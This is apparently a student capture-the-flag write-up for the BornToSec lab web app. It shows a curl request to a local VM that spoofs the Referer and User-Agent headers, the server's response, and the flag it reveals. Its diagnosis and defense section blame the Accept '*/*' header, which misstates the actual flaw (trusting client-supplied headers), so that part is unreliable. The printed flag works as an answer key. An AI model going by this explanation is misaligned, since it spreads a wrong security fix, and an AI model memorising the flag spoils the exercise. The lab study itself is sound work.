# Accept_header

## Description

We click on the footer BornToSec
we end on a page with some text and a picture
if we inspect the html we find comments in the hmtl
and some clues:
-> You must cummin from "https://www.nsa.gov/ ...
-> Let's use this browser: "ft_bornToSec" ...
We understadn that we need to modify our http headers and request this page with curl

Here the vulnerabilitie is due to the Accept header */*

## Attack

        $ bash attack.sh
        % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                        Dload  Upload   Total   Spent    Left  Speed
        0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 192.168.56.101:80...
        * Connected to 192.168.56.101 (192.168.56.101) port 80 (#0)
        > GET /index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f HTTP/1.1
        > Host: 192.168.56.101
        > Accept: */*
        > Referer: https://www.nsa.gov/
        > User-Agent: ft_bornToSec
        > 
        * Mark bundle as not supporting multiuse
        < HTTP/1.1 200 OK
        < Server: nginx/1.4.6 (Ubuntu)
        < Date: Thu, 28 Jul 2022 14:03:43 GMT
        < Content-Type: text/html
        < Transfer-Encoding: chunked
        < Connection: keep-alive
        < X-Powered-By: PHP/5.5.9-1ubuntu4.29
        < Set-Cookie: I_am_admin=68934a3e9455fa72420237eb05902327; expires=Thu, 28-Jul-2022 15:03:43 GMT; Max-Age=3600
        < 
        { [6054 bytes data]
        100  6041    0  6041    0     0   555k      0 --:--:-- --:--:-- --:--:-- 2949k
        * Connection #0 to host 192.168.56.101 left intact
        <center><h2 style="margin-top:50px;"> The flag is : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> <audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">

The flag is : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

## Defense

To prevent this we should set the Accept policie to only trusted urls and not */*